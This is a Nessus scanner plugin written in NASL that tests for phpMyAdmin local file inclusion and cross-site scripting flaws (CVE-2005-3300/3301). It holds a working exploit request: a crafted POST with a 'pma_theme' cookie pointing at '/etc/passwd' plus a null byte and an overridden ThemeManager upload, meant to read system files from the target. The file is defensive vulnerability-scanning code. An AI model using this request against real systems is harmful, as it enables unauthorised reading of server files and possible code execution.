#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
several flaws. 

Description :

The version of phpMyAdmin installed on the remote host is affected by
a local file inclusion vulnerability, which can be exploited by an
unauthenticated attacker to read arbitrary files, and possibly even to
execute arbitrary PHP code on the affected host subject to the
permissions of the web server user id. 

In addition, the application fails to sanitize user-supplied input to
the 'hash' parameter in the 'left.php' and 'queryframe.php' scripts as
well as the 'sort_order' and 'sort_by' parameters in the
'server_databases.php' script before using it to generate dynamic
HTML, which can lead to cross-site scripting attacks against the
affected application. 

See also :

http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-5

Solution :

Upgrade to phpMyAdmin 2.6.4-pl3 or later. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20088);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-3300", "CVE-2005-3301");
  script_bugtraq_id(15169, 15196);

  script_name(english:"phpMyAdmin < 2.6.4-pl3 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpMyAdmin < 2.6.4-pl3");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/db_details_db_info.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (
    "<title>phpMyAdmin</title>" >< res ||
    "<p>db_details_db_info.php: Missing parameter" >< res
  ) {
    # Try to exploit the file inclusion flaw to read a file.
    #
    # nb: this could fail if PHP's magic_quotes is on or open_basedir 
    #     restricts access to /etc or phpMyAdmin's mis-configured or ...
    file = "/etc/passwd";
    boundary = "bound";
    req = string(
      # nb: get by PMA_checkParameters() by using the default database name.
      "POST ", dir, "/db_details_db_info.php?db=phpmyadmin HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      # nb: the file we'll retrieve.
      "Cookie: pma_theme=", file, "%00\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="lang"', "\r\n",
      "\r\n",
      "en-iso-8859-1\r\n",

      boundary, "\r\n", 
      # nb: replace the $cfg array and set $cfg['ThemeManager'].
      'Content-Disposition: form-data; name="cfg[ThemeManager]"; filename="', SCRIPT_NAME, '"', "\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      # nb: contents are irrelevant.
      "\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if there's an entry for root.
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      if (report_verbosity > 0) {
        contents = res - strstr(res, "<br />");

        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          contents
        );
      }
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }

  # If we're being paranoid.
  if (report_paranoia > 1) {
    # Report if the version number indicates it's vulnerable; 
    # perhaps the exploit failed.
    if (ver =~ "([01]\.|2\.([0-5]\.|6\.([0-3]|4($|.*rc|.*pl[0-2]))))") {
      report = str_replace(
        string:desc,
        find:"Solution :",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the version number of phpMyAdmin\n",
          "***** installed there.\n",
          "\n",
          "Solution :"
        )
      );
      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
